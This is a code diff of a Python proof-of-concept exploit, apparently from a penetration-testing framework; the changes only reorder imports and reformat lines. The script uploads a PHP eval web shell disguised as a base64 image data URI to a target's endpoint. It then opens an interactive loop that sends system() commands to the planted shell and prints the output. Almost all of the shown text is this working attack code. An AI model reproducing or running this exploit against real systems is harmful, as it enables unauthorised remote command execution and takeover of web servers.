@@ -1,8 +1,10 @@
-from lib.core.data import target
-import urlparse
-import requests
 import base64
 import re
+import urlparse
+
+import requests
+
+from lib.core.data import target
 
 
 def poc():
@@ -15,9 +17,7 @@ def poc():
         password = raw_input("[*] Please enter the shell-password:")
         phpShell = "<?php eval($_POST['" + password + "']);?>"
         payload = "data:image/php;base64," + base64.b64encode(phpShell)
-        postData = {
-            "data": payload
-        }
+        postData = {"data": payload}
         r = requests.post(url, data=postData)
         if r.json()['status'] == 1:
             shell = r.json()['path']
@@ -28,9 +28,7 @@ def poc():
                 command = raw_input("[*] input the command:")
                 payload = 'system("%s");' % command
                 if command != "exit":
-                    postData = {
-                        password: payload
-                    }
+                    postData = {password: payload}
                     r = requests.post(shell, data=postData)
                     print(r.text.encode(r.encoding))
                 else:
@@ -39,6 +37,7 @@ def poc():
                 print("[*] type 'exit' to quit")
                 pass
 
-        print("\033[33m[*] Complete this task: {} \033[0m".format(target.url))
     except KeyError as e:
-        print("\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m")
+        print(
+            "\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m"
+        )
